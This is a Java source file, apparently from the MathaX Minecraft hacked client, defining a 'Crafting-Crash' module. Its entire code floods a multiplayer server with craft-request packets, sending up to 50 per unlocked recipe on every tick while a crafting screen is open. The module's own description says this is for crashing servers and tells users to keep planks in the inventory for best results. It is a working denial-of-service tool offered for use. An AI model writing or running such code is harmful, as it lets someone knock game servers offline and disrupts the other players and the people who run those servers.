package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.minecraft.screen.CraftingScreenHandler;

import java.util.List;

public class CraftingCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick. Warning: this is multiplied by the amount of unlocked recipes")
        .defaultValue(24)
        .min(1)
        .sliderMax(50)
        .build());

    public CraftingCrash() {
        super(Categories.Crash, Items.CRAFTING_TABLE, "Crafting-Crash", "Spam craft request packets. Use with planks in inventory for best results.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!(mc.player.currentScreenHandler instanceof CraftingScreenHandler) || mc.getNetworkHandler() == null) return;
        try {
            List<RecipeResultCollection> recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                for (Recipe<?> recipe : recipeResultCollection.getRecipes(true)) {
                    for (int i = 0; i < packets.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(mc.player.currentScreenHandler.syncId, recipe, true));
                    }
                }
            }

        } catch (Exception ignored) {
            error("Stopping crash because an error occurred!");
            toggle();
        }
    }
}

